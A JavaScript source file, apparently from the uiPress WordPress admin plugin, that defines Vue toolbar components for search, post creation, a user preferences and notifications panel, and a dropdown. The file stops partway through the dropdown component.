const UIPtoolbarOptions = {
  data() {
    return {
      loading: true,
      screenWidth: window.innerWidth,
      translations: uipTranslations,
      masterPrefs: uipMasterPrefs,
      defaults: uipDefaults,
      userPreferences: uipUserPrefs,
      uipToolbar: "",
    };
  },
  watch: {},
  created: function () {
    window.addEventListener("resize", this.getScreenWidth);
  },
  computed: {},
  mounted: function () {
    window.setInterval(() => {
      ///TIMED FUNCTIONS
    }, 15000);
    this.loading = false;
  },
  methods: {
    showLegacy() {
      if (this.userPreferences.legacy_admin_links == true || this.masterPrefs.toolbar.options["legacy-admin"].value == true) {
        return false;
      }
      return true;
    },
    getScreenWidth() {
      this.screenWidth = window.innerWidth;
    },
    isSmallScreen() {
      if (this.screenWidth < 900) {
        return true;
      } else {
        return false;
      }
    },
    toggleMenu() {
      jQuery("#adminmenumain").toggleClass("uip-mobile-menu");
    },
  },
};
const UIPtoolbar = uipVue.createApp(UIPtoolbarOptions);

UIPtoolbar.component("toolbar-logo", {
  props: {
    defaults: Object,
    options: Object,
    translations: Object,
    preferences: Object,
  },
  data: function () {
    return {
      loading: true,
    };
  },
  mounted: function () {
    this.loading = false;
  },
  methods: {
    getLogo() {
      if (this.options.menu.options["light-logo"].value) {
        return this.options.menu.options["light-logo"].value;
      } else {
        return this.defaults.logo;
      }
    },
    getDarkLogo() {
      if (this.options.menu.options["dark-logo"].value) {
        return this.options.menu.options["dark-logo"].value;
      } else {
        return this.defaults.darkLogo;
      }
    },
    isTrue(thetest) {
      if (thetest == "true" || thetest == true) {
        return true;
      }
      if (thetest == "false" || thetest == false || thetest == "") {
        return false;
      }
    },
    showTitle() {
      if (this.options.menu.options["show-site-logo"].value == true) {
        return true;
      }
      return false;
    },
  },
  template:
    '<div class="uip-flex uip-flex-center" id="uip-front-toolbar-logo">\
        <div class="uip-margin-right-s">\
            <a v-if="!loading" :href="defaults.adminHome" class="uip-no-outline">\
                <img v-if="preferences.darkmode != true" class="uip-display-block uip-h-28 uip-max-h-28" :src="getLogo()">\
                <img v-if="preferences.darkmode" class="uip-display-block uip-h-28 uip-max-h-28" :src="getDarkLogo()">\
            </a>\
            <a v-if="loading" href="#">\
                <div class="uip-border-circle uip-background-muted" style="height:35px;width:35px;"></div>\
            </a>\
        </div>\
        <div v-if="showTitle()" class="uip-margin-right-m uip-text-bold uip-text-m uip-body-font">\
          {{defaults.siteName}}\
        </div>\
    </div>',
});

UIPtoolbar.component("toolbar-search", {
  props: {
    defaults: Object,
    options: Object,
    translations: Object,
    preferences: Object,
  },
  data: function () {
    return {
      loading: true,
      search: {
        open: false,
        term: "",
        perPage: 20,
        currentPage: 1,
        results: [],
        totalFound: 0,
        categorized: [],
        nothingFound: false,
      },
    };
  },
  mounted: function () {
    this.loading = false;
  },
  computed: {
    searchedCats() {
      return this.search.categorized;
    },
  },
  methods: {
    masterSearch() {
      adminbar = this;
      searchString = this.search.term;
      perpage = this.search.perPage;
      currentpage = this.search.currentPage;
      this.search.loading = true;
      this.search.nothingFound = false;

      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: {
          action: "uip_master_search",
          security: uip_ajax.security,
          search: searchString,
          perpage: perpage,
          currentpage: currentpage,
        },
        success: function (response) {
          adminbar.search.loading = false;
          if (response) {
            data = JSON.parse(response);
            if (data.error) {
              UIkit.notification(data.error_message, "danger");
            } else {
              adminbar.search.results = data.founditems;
              adminbar.search.totalPages = data.totalpages;
              adminbar.search.totalFound = data.totalfound;
              adminbar.search.categorized = data.categorized;

              if (data.totalpages == 0) {
                adminbar.search.nothingFound = true;
                return;
              }

              if (adminbar.search.currentPage > data.totalpages) {
                adminbar.search.currentPage = 1;
                adminbar.masterSearch();
              }
            }
          }
        },
      });
    },
    loadMoreResults() {
      perpage = this.search.perPage;
      this.search.perPage = Math.floor(perpage * 3);
      this.masterSearch();
    },
    openSearch() {
      if (document.activeElement) {
        document.activeElement.blur();
      }
      this.search.open = true;
    },
    closeSearch() {
      if (document.activeElement) {
        document.activeElement.blur();
      }
      this.search.open = false;
    },
    isEnabled() {
      search = this.options.toolbar.options["search-disabled"].value;

      if (search == "true" || search === true) {
        return false;
      }

      return true;
    },
  },
  template:
    '<div v-if="isEnabled()" class="uip-flex uip-flex-center">\
       <span @click="openSearch()"\
       class="material-icons-outlined uip-background-icon uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer">\
          search\
       </span>\
    </div>\
    <div v-if="search.open" class="uip-position-fixed uip-w-100p uip-h-viewport uip-hidden uip-text-normal" \
    style="background:rgba(0,0,0,0.3);z-index:99999;top:0;left:0;right:0;max-height:100vh" \
    :class="{\'uip-nothidden\' : search.open}">\
      <!-- MODAL GRID -->\
      <div class="uip-flex uip-w-100p">\
        <div class="uip-flex-grow" @click="closeSearch()" ></div>\
        <div class="uip-w-500 uip-background-default uip-padding-m uip-overflow-auto " >\
          <div class="" style="max-height: 100vh;">\
            <!-- SEARCH TITLE -->\
            <div class="uip-flex uip-margin-bottom-s">\
              <div class="uip-text-xl uip-text-bold uip-flex-grow">{{translations.search}}</div>\
              <div class="">\
                 <span @click="search.open = false"\
                  class="material-icons-outlined uip-background-muted uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer">\
                     close\
                  </span>\
              </div>\
            </div>\
            <!-- CHECK CONNECTION -->\
            <div v-if="options.dataConnect != true" class="uip-margin-bottom-s">\
                <a href="https://uipress.co/pricing/" target="_BLANK" class="uip-no-underline uip-padding-xs uip-border-round uip-background-primary-wash uip-text-bold uip-text-emphasis uip-display-inline-block uip-display-block uip-w-100p uip-border-box">\
                    <div class="uip-flex">\
                      <span class="material-icons-outlined uip-margin-right-xs">redeem</span>\
                      <span>\
                        {{translations.preFeature}}\
                      </span>\
                    </div>\
                    <p class="uip-text-normal">{{translations.unlockSearch}}</p>\
                </a>\
            </div>\
            <!-- CHECK CONNECTION -->\
            <!-- SEARCH -->\
            <div class="uip-margin-bottom-m uip-padding-xs uip-background-muted uip-border-round">\
              <div class="uip-flex uip-flex-center">\
                <span class="uip-margin-right-xs uip-text-muted">\
                  <span class="material-icons-outlined">search</span>\
                </span> \
                <input type="search" :placeholder="translations.search" class="uip-blank-input uip-flex-grow" \
                v-on:keyup.enter="masterSearch()"\
                v-model="search.term" autofocus>\
              </div>\
            </div>\
            <!-- SEARCH RESULTS -->\
            <loading-placeholder v-if="search.loading"></loading-placeholder>\
            <loading-placeholder v-if="search.loading"></loading-placeholder>\
            <div v-if="search.nothingFound" class="uip-flex uip-flex-middle uip-flex-center uip-h-150">\
              <span class="uip-text-muted">{{translations.nothingFound}}</span>\
            </div>\
            <template v-for="cat in searchedCats" v-if="!search.loading">\
              <div class="uip-text-m uip-text-muted uip-border-round uip-text-bold uip-background-muted uip-padding-xs uip-margin-bottom-s" >{{cat.label}}</div>\
              <div class="uip-margin-bottom-s uip-padding-xs">\
                <template v-for="foundItem in cat.found" v-if="!search.loading">\
                  <div class="uip-margin-bottom-s">\
                    <div class="uip-flex uip-flex-middle">\
                      <div class="uip-margin-right-xs">\
                        <img v-if="foundItem.image" :src="foundItem.image" style="height:26px;border-radius: 4px;">\
                        <span v-if="foundItem.attachment && !foundItem.image" class="uip-background-primary-wash uip-padding-xxs uip-text-s uip-border-round">{{foundItem.mime}}</span>\
                        <span v-if="!foundItem.attachment && !foundItem.image" class="uip-background-primary-wash uip-padding-xxs uip-text-s uip-border-round" :class="foundItem.status" style="display: block;">{{foundItem.status}}</span>\
                      </div>\
                      <div class="uip-flex-grow uip-margin-right-xs uip-flex uip-flex-center">\
                        <a class="uip-link-muted uip-no-underline uip-no-outline" :href="foundItem.editUrl" v-html="foundItem.name"></a>\
                        <div>\
                        </div>\
                      </div>\
                      <div class="uip-margin-right-xs">\
                        <a :href="foundItem.editUrl"\
                        class="material-icons-outlined uip-background-muted uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer uip-link-muted uip-no-underline uip-no-outline">\
                           edit_note\
                        </a>\
                      </div>\
                      <div class="uip-margin-right-xs">\
                        <a :href="foundItem.url"\
                        class="material-icons-outlined uip-background-muted uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer uip-link-muted uip-no-underline uip-no-outline">\
                           pageview\
                        </a>\
                      </div>\
                    </div>\
                  </div>\
                </template>\
              </div>\
            </template>\
            <!-- LOAD MORE -->\
            <div v-if="search.totalPages > 1" class="uip-margin-bottom-s">\
              <button class="uip-button-secondary" @click="loadMoreResults">\
                <span>{{translations.showMore}}</span>\
                <span>({{search.totalFound - search.results.length}}</span>\
                <span>{{translations.otherMatches}})</span>\
              </button>\
            </div>\
          </div>\
        </div>\
      </div>\
    </div>',
});

UIPtoolbar.component("toolbar-create", {
  props: {
    defaults: Object,
    options: Object,
    translations: Object,
    preferences: Object,
  },
  data: function () {
    return {
      loading: true,
      create: {
        open: false,
        types: [],
        loading: false,
      },
    };
  },
  mounted: function () {
    this.loading = false;
  },
  computed: {
    postTypes() {
      return this.create.types;
    },
  },
  methods: {
    getPostTypes() {
      adminbar = this;
      adminbar.create.loading = true;

      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_get_create_types",
          security: uip_ajax.security,
        },
        success: function (response) {
          if (response) {
            data = JSON.parse(response);
            adminbar.create.loading = false;
            if (data.error) {
              UIkit.notification(data.error_message, "danger");
            } else {
              adminbar.create.types = data.types;
            }
          }
        },
      });
    },
    openSearch() {
      let self = this;
      if (self.create.types.length === 0) {
        self.getPostTypes();
      }
      this.create.open = true;
    },
    closeSearch() {
      if (document.activeElement) {
        document.activeElement.blur();
      }
      this.create.open = false;
    },
    isEnabled() {
      search = this.options.toolbar.options["new-enabled"].value;

      if (search == "true" || search === true) {
        return false;
      }

      return true;
    },
  },
  template:
    '<div v-if="isEnabled()" class="uip-flex uip-flex-center uip-margin-left-s">\
       <div @click="openSearch()"\
       class="uip-background-dark uip-padding-xxs uip-padding-left-xs uip-padding-right-xs  uip-border-round hover:uip-background-secondary uip-cursor-pointer uip-flex uip-flex-center uip-text-inverse">\
          <span>{{translations.create}}</span>\
          <span class="material-icons-outlined">chevron_right</span>\
       </div>\
    </div>\
    <div v-if="create.open" class="uip-position-fixed uip-w-100p uip-h-viewport uip-hidden uip-text-normal" \
    style="background:rgba(0,0,0,0.3);z-index:99999;top:0;left:0;right:0;max-height:100vh" \
    :class="{\'uip-nothidden\' : create.open}">\
      <!-- MODAL GRID -->\
      <div class="uip-flex uip-w-100p">\
        <div class="uip-flex-grow" @click="closeSearch()" ></div>\
        <div class="uip-w-500 uip-background-default uip-padding-m" >\
          <div  style="max-height: 100vh;">\
            <!-- CREATE TITLE -->\
            <div class="uip-flex uip-margin-bottom-m">\
              <div class="uip-text-xl uip-text-bold uip-flex-grow">{{translations.create}}</div>\
              <div class="">\
                 <span @click="create.open = false"\
                  class="material-icons-outlined uip-background-muted uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer">\
                     close\
                  </span>\
              </div>\
            </div>\
            <!-- SEARCH RESULTS -->\
            <loading-placeholder v-if="create.loading"></loading-placeholder>\
            <loading-placeholder v-if="create.loading"></loading-placeholder>\
            <div class="">\
              <template v-for="type in postTypes">\
                <a :href="type.href" class="uip-flex uip-flex-middle uip-flex-center uip-margin-bottom-xs uip-padding-xxs hover:uip-background-muted uip-border-round uip-link-muted uip-no-underline" >\
                  <span class="uip-background-dark uip-text-inverse uip-border-round uip-margin-right-s uip-padding-xxs uip-flex uip-flex-center">\
                    <span v-if="type.icon" class="dashicons uip-h-18 uip-w-18" :class="type.icon"></span>\
                    <span  v-if="!type.icon" class="material-icons-outlined uip-h-18 uip-w-18">post_add</span>\
                  </span>\
                  <span class="uip-flex-grow uip-text-bold" style="font-size:16px;">{{type.name}}</span>\
                  <span class="material-icons-outlined">chevron_right</span>\
                </a>\
              </template>\
            </div>\
          </div>\
        </div>\
      </div>\
    </div>',
});

UIPtoolbar.component("toolbar-offcanvas", {
  emits: ["updateprefs"],
  props: {
    defaults: Object,
    options: Object,
    translations: Object,
    preferences: Object,
  },
  data: function () {
    return {
      loading: true,
      settings: {
        defaults: this.defaults,
        translations: this.translations,
        preferences: this.preferences,
      },
      panel: {
        open: false,
      },
      updates: {
        allUpdates: [],
        loading: false,
        updateCount: 0,
      },
      notices: {
        allNotices: [],
        formatted: [],
        loading: false,
        noticeCount: 0,
        supressed: [],
        suppressedForPage: 0,
      },
      prefs: this.preferences,
    };
  },
  watch: {
    "prefs.darkmode": function (newValue, oldValue) {
      if (newValue != oldValue) {
        this.uip_save_preferences("darkmode", newValue, false);
        this.returnPrefs();

        if (newValue == true) {
          jQuery("html").attr("data-theme", "dark");
        } else {
          jQuery("html").attr("data-theme", "light");
        }
      }
    },
    "prefs.screen_options": function (newValue, oldValue) {
      if (newValue != oldValue) {
        this.returnPrefs();
        this.uip_save_preferences("screen_options", newValue, false);
      }
    },
    "prefs.legacy_admin_links": function (newValue, oldValue) {
      if (newValue != oldValue) {
        this.returnPrefs();
        this.uip_save_preferences("legacy_admin_links", newValue, false);
      }
    },
  },
  mounted: function () {
    this.loading = false;
  },
  computed: {
    allUpdates() {
      return this.updates.allUpdates;
    },
    formatNotices() {
      let toolbar = this;
      data = jQuery.parseHTML(toolbar.notices.allNotices);
      notis = [];
      supressed = toolbar.notices.supressed;
      toolbar.notices.suppressedForPage = 0;

      jQuery(data).each(function () {
        temp = [];

        text = jQuery(this).text().trim().substring(0, 40);
        html = jQuery(this).prop("outerHTML");

        if (html) {
          if (!supressed.includes(text)) {
            temp["type"] = "primary";
            if (html.includes("notice-error")) {
              temp["type"] = "errormsg";
            }
            if (html.includes("notice-warning")) {
              temp["type"] = "warning";
            }
            if (html.includes("notice-success")) {
              temp["type"] = "success";
            }
            if (html.includes("notice-info")) {
              temp["type"] = "info";
            }

            temp["content"] = html;
            temp["shortDes"] = text;
            temp["open"] = false;
            notis.push(temp);
          } else {
            toolbar.notices.suppressedForPage += 1;
          }
        }
      });
      toolbar.notices.formatted = notis;
      toolbar.notices.noticeCount = notis.length;
      return toolbar.notices.formatted;
    },
  },
  methods: {
    uip_save_preferences(pref, value, notification = null) {
      if (pref == "") {
        return;
      }

      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: {
          action: "uip_save_user_prefs",
          security: uip_ajax.security,
          pref: pref,
          value: value,
        },
        success: function (response) {
          if (response) {
            data = JSON.parse(response);
            if (data.error) {
              uipNotification(data.error_message, "danger");
            } else {
              uipNotification(data.message, "success");
            }
          }
        },
      });
    },
    isDisabled(optionName) {
      notifications = this.options.toolbar.options[optionName].value;

      if (notifications == "true" || notifications === true) {
        return false;
      }

      return true;
    },
    getNoticeClass(noticetype) {
      if (noticetype == "info" || noticetype == "primary") {
        return "uip-background-primary-wash";
      }
      if (noticetype == "warning") {
        return "uip-background-orange-wash";
      }
      if (noticetype == "errormsg") {
        return "uip-background-red-wash";
      }
      if (noticetype == "success") {
        return "uip-background-green-wash";
      }
    },
    hideNotification(des) {
      this.notices.supressed.push(des);
      this.uip_save_preferences("uip-supressed-notifications", this.notices.supressed, false);
      uipNotification(this.settings.translations.notificationHidden, "success");
    },
    showAllNotifications() {
      this.notices.supressed = [];
      this.uip_save_preferences("uip-supressed-notifications", [""], false);
    },
    returnPrefs() {
      data = this.prefs;
      this.$emit("updateprefs", data);
    },
    openOffcanvas() {
      let self = this;
      if (self.updates.allUpdates.length === 0) {
        self.getUpdates();
        self.getNotices();
      }
      self.panel.open = true;
    },
    getUpdates() {
      adminbar = this;
      adminbar.updates.loading = true;

      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_get_updates",
          security: uip_ajax.security,
        },
        success: function (response) {
          if (response) {
            data = JSON.parse(response);
            adminbar.updates.loading = false;
            if (data.error) {
              UIkit.notification(data.error_message, "danger");
            } else {
              adminbar.updates.allUpdates = data.updates;
              adminbar.updates.updateCount = data.total;
            }
          }
        },
      });
    },
    getNotices() {
      adminbar = this;
      adminbar.notices.loading = true;

      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: {
          action: "uipress_get_notices",
          security: uip_ajax.security,
        },
        success: function (response) {
          if (response) {
            data = JSON.parse(response);
            adminbar.notices.loading = false;
            if (data.error) {
              UIkit.notification(data.error_message, "danger");
            } else {
              console.log(data);
              adminbar.notices.allNotices = data.notices;
              adminbar.notices.supressed = data.supressed;
            }
          }
        },
      });
    },
    isfront() {
      front = this.settings.defaults.front;
      if (front == "true" || front === true) {
        return true;
      }
      return false;
    },
    showLegacy() {
      if (this.options.toolbar.options["legacy-admin"].value == true) {
        return false;
      }
      return true;
    },
    getTarget() {
      newtab = this.options.toolbar.options["view-new-tab"].value;

      if (newtab == true || newtab == "true") {
        return "_BLANK";
      }

      return "_self";
    },
  },
  template:
    '<div class="uip-flex uip-flex-center uip-margin-left-s" style="height:100%">\
      <div @click="openOffcanvas()"\
      class="uip-background-primary uip-border-circle uip-w-28 uip-h-28 hover:uip-background-primary-dark uip-flex uip-flex-center uip-flex-middle">\
        <span v-if="!settings.defaults.user.img" class="uip-text-inverse uip-text-m uip-no-select uip-line-height-0" >{{defaults.user.initial}}</span>\
        <img v-if="settings.defaults.user.img" class="uip-border-circle uip-w-100p" :src="settings.defaults.user.img">\
      </div>\
    </div>\
    <div v-if="panel.open" class="uip-position-fixed uip-w-100p uip-h-viewport uip-hidden uip-text-normal" \
    style="background:rgba(0,0,0,0.3);z-index:99999;top:0;left:0;right:0;max-height:100vh" \
    :class="{\'uip-nothidden\' : panel.open}">\
      <!-- MODAL GRID -->\
      <div class="uip-flex uip-w-100p">\
        <div class="uip-flex-grow" @click="panel.open = false" ></div>\
        <div class="uip-w-500 uip-background-default uip-padding-m uip-max-h-viewport uip-overflow-auto" >\
          <div class="uip-text-normal"  style="max-height: 100vh;">\
            <!-- MODAL TITLE -->\
            <div class="uip-flex uip-flex-middle uip-margin-bottom-m">\
              <div class="uip-margin-right-s">\
                <div class="uip-border-circle uip-flex uip-flex-middle uip-flex-center uip-text-inverse uip-w-40 uip-h-40 uip-overflow-hidden" :class="{\'uip-background-primary\' : !settings.defaults.user.img}">\
                  <span v-if="!settings.defaults.user.img" class="uip-text-inverse uip-text-l  uip-line-height-0" >{{settings.defaults.user.initial}}</span>\
                  <img v-if="settings.defaults.user.img" :src="settings.defaults.user.img" style="width:100%;">\
                </div>\
              </div>\
              <div class="uip-flex-grow">\
                <div class="uip-text-l uip-text-bold uip-overflow-hidden uip-text-ellipsis uip-max-w-200" style="line-height:1">{{settings.defaults.user.username}}</div>\
                <div class="uip-text-muted uip-overflow-hidden uip-text-ellipsis uip-max-w-200">{{settings.defaults.user.email}}</div>\
              </div>\
              <div class="">\
                <div @click="panel.open = false"\
                 class="material-icons-outlined uip-background-muted uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer">\
                    close\
                 </div>\
              </div>\
            </div>\
            <div v-if="panel.loading" >\
              <loading-placeholder ></loading-placeholder>\
            </div>\
            <!-- QUICK LINKS BLOCK -->\
            <div  class="uip-flex uip-margin-bottom-s" >\
              <div class="uip-w-50p uip-padding-right-s">\
                <a v-if="!isfront()" :href="settings.defaults.siteHome" :target="getTarget()"\
                class="uip-flex uip-flex-middle uip-flex-center uip-padding-xs uip-background-muted hover:uip-background-grey uip-border-round uip-link-muted uip-no-underline uip-text-m uip-flex-left">\
                  <span class="material-icons-outlined uip-margin-right-s">launch</span>\
                  <span class="uip-text-bold ">{{settings.translations.viewSite}}</span>\
                </a>\
                <a v-if="isfront()" :href="settings.defaults.adminHome"\
                  class="uip-flex uip-flex-middle uip-flex-center uip-padding-xs uip-background-muted hover:uip-background-grey uip-border-round uip-link-muted uip-no-underline uip-text-m uip-flex-left">\
                  <span class="material-icons-outlined uip-margin-right-s">launch</span>\
                  <span class="uip-text-bold ">{{settings.translations.viewDashboard}}</span>\
                </a>\
              </div>\
              <div class="uip-w-50p">\
                <a :href="settings.defaults.logOut"\
                class="uip-flex uip-flex-middle uip-flex-center uip-padding-xs uip-background-muted hover:uip-background-grey uip-border-round uip-link-muted uip-no-underline uip-text-m uip-flex-left">\
                  <span class="material-icons-outlined uip-margin-right-s">logout</span>\
                  <span class="uip-text-bold ">{{settings.translations.logOut}}</span>\
                </a>\
              </div>\
            </div>\
            <!-- UPDATE BLOCK -->\
            <div class="" v-if="updates.updateCount > 0">\
              <!-- UPDATE HEADER -->\
              <div class="uip-flex uip-flex-middle uip-margin-bottom-s uip-background-muted uip-border-rounded uip-padding-xs uip-border-round" >\
                <div class="uip-text-m uip-text-bold uip-flex-grow">\
                  {{settings.translations.updates}}\
                </div>\
                <div v-if="updates.updateCount > 0" class="uip-background-orange-wash  uip-text-orange uip-text-bold uip-border-round  uip-padding-left-xxs uip-padding-right-xxs uip-text-s uip-border-round uip-text-orange">\
                  {{updates.updateCount}}\
                </div>\
              </div>\
              <!-- UPDATE LIST -->\
              <loading-placeholder v-if="updates.loading"></loading-placeholder>\
              <div class="uip-margin-bottom-s">\
                <template v-if="!updates.loading" v-for="cat in allUpdates">\
                  <a :href="cat.href" class="uip-flex uip-flex-middle uip-flex-center uip-padding-xs hover:uip-background-muted uip-border-round uip-link-muted uip-no-underline">\
                    <span class="material-icons-outlined uip-margin-right-s">{{cat.icon}}</span>\
                    <div class="uip-flex-grow">\
                      {{cat.title}}\
                    </div>\
                    <div v-if="cat.total > 0" class="uip-background-orange-wash uip-text-orange uip-text-bold uip-border-round  uip-padding-left-xxs uip-padding-right-xxs uip-text-s uip-border-round">\
                      {{cat.total}}\
                    </div>\
                    <div v-if="cat.total == 0" class="">\
                      <span class="material-icons-outlined uip-text-green">check_circle</span>\
                    </div>\
                  </a>\
                </template>\
              </div>\
            </div>\
            <!-- PREFERENCES BLOCK -->\
            <div class="uip-margin-bottom-s">\
              <!-- PREFS HEADER -->\
              <div class="uip-flex uip-flex-middle uip-margin-bottom-s uip-background-muted uip-border-rounded uip-padding-xs uip-border-round">\
                <div class="uip-text-m uip-text-bold uip-flex-grow">\
                  {{settings.translations.preferences}}\
                </div>\
              </div>\
              <!-- PREFS LIST -->\
              <div>\
                <!-- DARK MODE -->\
                <div v-if="options.general.options[\'dark-disabled\'].value != true" class="uip-flex uip-flex-middle uip-flex-center uip-padding-xs">\
                  <span class="material-icons-outlined uip-margin-right-s">dark_mode</span>\
                  <div class="uip-flex-grow">\
                    {{settings.translations.darkMode}}\
                  </div>\
                  <div class="">\
                    <label class="uip-switch">\
                      <input type="checkbox" v-model="prefs.darkmode">\
                      <span class="uip-slider"></span>\
                    </label>\
                  </div>\
                </div>\
                <!-- SCREEN OPTIONS -->\
                <div class="uip-flex uip-flex-middle uip-flex-center uip-padding-xs">\
                  <span class="material-icons-outlined uip-margin-right-s">tune</span>\
                  <div class="uip-flex-grow">\
                    {{settings.translations.showScreenOptions}}\
                  </div>\
                  <div class="">\
                    <label class="uip-switch">\
                      <input type="checkbox" v-model="prefs.screen_options">\
                      <span class="uip-slider"></span>\
                    </label>\
                  </div>\
                </div>\
                <!-- LEGACY LINKS OPTIONS -->\
                <div class="uip-flex uip-flex-middle uip-flex-center uip-padding-xs"\
                v-if="showLegacy()">\
                  <span class="material-icons-outlined uip-margin-right-s">link_off</span>\
                  <div class="uip-flex-grow">\
                    {{settings.translations.hideLegacy}}\
                  </div>\
                  <div class="">\
                    <label class="uip-switch">\
                      <input type="checkbox" v-model="prefs.legacy_admin_links">\
                      <span class="uip-slider"></span>\
                    </label>\
                  </div>\
                </div>\
              </div>\
            </div>\
            <!-- NOTICES BLOCK -->\
            <div v-if="isDisabled(\'notification-center-disabled\') && formatNotices.length > 0" >\
              <!-- NOTICE HEADER -->\
              <div class="uip-flex uip-flex-middle uip-margin-bottom-s uip-background-muted uip-border-rounded uip-padding-xs uip-border-round" >\
                <div class="uip-text-m uip-text-bold uip-flex-grow">\
                  {{settings.translations.notifications}}\
                </div>\
                <div v-if="formatNotices.length > 0" class="uip-background-orange-wash uip-text-orange uip-text-bold uip-border-round  uip-padding-left-xxs uip-padding-right-xxs uip-text-s">\
                  {{formatNotices.length}}\
                </div>\
              </div>\
              <!-- NOTICES LIST -->\
              <div class="" v-if="options.dataConnect != true">\
                <a href="https://uipress.co/pricing/" target="_BLANK" class="uip-no-underline uip-padding-xs uip-border-round uip-background-primary-wash uip-text-bold uip-text-emphasis uip-display-inline-block uip-display-block">\
                    <div class="uip-flex">\
                      <span class="material-icons-outlined uip-margin-right-xs">redeem</span>\
                      <span>\
                        {{translations.preFeature}}\
                      </span>\
                    </div>\
                    <p class="uip-text-normal">{{translations.unlockNotificationCenter}}</p>\
                </a>\
              </div>\
              <div v-if="options.dataConnect == true">\
                <loading-placeholder v-if="notices.loading"></loading-placeholder>\
                <template v-if="!notices.loading" v-for="notice in formatNotices">\
                  <div class="uip-background-muted uip-border-round uip-margin-bottom-s uip-padding-xs">\
                    <div class="uip-flex">\
                      <span class="uip-margin-right-s uip-border-circle uip-h-18 uip-w-18" :class="getNoticeClass(notice.type)"></span>\
                      <div class="uip-text-bold uip-flex-grow" v-html="notice.shortDes">\
                      </div>\
                      <span v-if="!notice.open" @click="notice.open = true" class="material-icons-outlined uip-cursor-pointer">chevron_left</span>\
                      <span v-if="notice.open" @click="notice.open = false" class="material-icons-outlined uip-cursor-pointer">expand_more</span>\
                    </div>\
                    <div v-if="notice.open" class="uip-margin-top-xs">\
                      <button @click="hideNotification(notice.shortDes)" class="uip-button-secondary">{{settings.translations.hideNotification}}</button>\
                    </div>\
                    <div v-if="notice.open" class="uip-margin-top-xs">\
                      <div v-html="notice.content"></div>\
                    </div>\
                  </div>\
                </template>\
                <div v-if="notices.suppressedForPage > 0" >\
                  <span>{{notices.suppressedForPage}} {{settings.translations.hiddenNotification}}</span>\
                  <a href="#" @click="showAllNotifications()" >{{settings.translations.showAll}}</a>\
                </div>\
              </div>\
            </div>\
          </div>\
        </div>\
      </div>\
    </div>',
});

UIPtoolbar.component("toolbar-links", {
  props: {
    defaults: Object,
    options: Object,
    translations: Object,
    preferences: Object,
  },
  data: function () {
    return {
      loading: true,
    };
  },
  mounted: function () {
    this.loading = false;
  },
  computed: {},
  methods: {
    toggleScreenMeta() {
      jQuery("#screen-meta").toggleClass("uip-show-so");
    },

    isEnabled() {
      search = this.options.toolbar.options["view-enabled"].value;

      if (search == "true" || search === true) {
        return false;
      }

      return true;
    },
    isfront() {
      front = this.defaults.front;
      if (front == "true" || front === true) {
        return true;
      }
      return false;
    },
    showScreenOptions() {
      let screen = this.preferences.screen_options;
      if (screen == "true" || screen === true) {
        if (!this.isfront()) {
          return true;
        } else {
          return false;
        }
      }
      return false;
    },
    getTarget() {
      newtab = this.options.toolbar.options["view-new-tab"].value;

      if (newtab == true || newtab == "true") {
        return "_BLANK";
      }

      return "_self";
    },
  },
  template:
    '<div class="uip-flex uip-flex-center" style="height:100%">\
      <a v-if="isEnabled() && !isfront()" :href="defaults.siteHome" :target="getTarget()"\
      class="material-icons-outlined uip-background-icon uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer uip-toolbar-link uip-no-underline uip-no-outline uip-margin-left-xs">\
       house\
      </a>\
      <a v-if="isEnabled() && isfront()" :href="defaults.adminHome"\
      class="material-icons-outlined uip-background-icon uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer uip-toolbar-link uip-no-underline uip-no-outline uip-margin-left-xs">\
        dashboard\
      </a>\
      <span v-if="showScreenOptions()"\
      @click="toggleScreenMeta()" \
      class="material-icons-outlined uip-background-icon uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer uip-margin-left-xs">\
        tune\
      </span>\
    </div>',
});

/////////////////////////
//ADDS FEATURE TAG///////
/////////////////////////
UIPtoolbar.component("feature-flag", {
  props: {
    translations: Object,
  },
  data: function () {
    return {
      loading: true,
    };
  },
  mounted: function () {},
  methods: {},
  template:
    '<span class="uip-padding-xxs uip-border-round uip-background-orange uip-text-bold uip-text-white uip-flex">\
	  <span class="material-icons-outlined uip-margin-right-xs">\
	  	card_giftcard\
	  </span>\
  	  <span>\
		{{translations.preFeature}}\
	  </span>\
  	</span>',
});

/////////////////////////
//ADDS DROPDOWN//////////
/////////////////////////
UIPtoolbar.component("uip-dropdown", {
  props: {
    type: String,
    icon: String,
    pos: String,
    translation: String,
    size: String,
    primary: Boolean,
  },
  data: function () {
    return {
      modelOpen: false,
    };
  },
  mounted: function () {},
  methods: {
    onClickOutside(event) {
      const path = event.path || (event.composedPath ? event.composedPath() : undefined);
      // check if the MouseClick occurs inside the component
      if (path && !path.includes(this.$el) && !this.$el.contains(event.target)) {
        this.closeThisComponent(); // whatever method which close your component
      }
    },
    openThisComponent() {
      this.modelOpen = this.modelOpen != true; // whatever codes which open your component
      // You can also use Vue.$nextTick or setTimeout
      requestAnimationFrame(() => {
        document.documentElement.addEventListener("click", this.onClickOutside, false);
      });
    },
    closeThisComponent() {
      this.modelOpen = false; // whatever codes which close your component
      document.documentElement.removeEventListener("click", this.onClickOutside, false);
    },
    getClass() {
      if (this.pos == "botton-left") {
        return "uip-margin-top-s uip-right-0";
      }
      if (this.pos == "botton-right") {
        return "uip-margin-top-s uip-left-0";
      }
      if (this.pos == "full-screen") {
        return "uip-margin-top-s uip-left-0 uip-right-0";
      }
      if (this.pos == "botton-center") {
        return "uip-margin-top-s uip-right-center";
      }
      if (this.pos == "top-left") {
        return "uip-margin-bottom-s uip-right-0 uip-bottom-100p";
      }
    },
    getPaddingClass() {
      if (!this.size) {
        return "uip-padding-xs";
      }
      if (this.size == "small") {
        return "uip-padding-xxs";
      }
      if (this.size == "large") {
        return "uip-padding-s";
      }
      return "uip-padding-xs";
    },
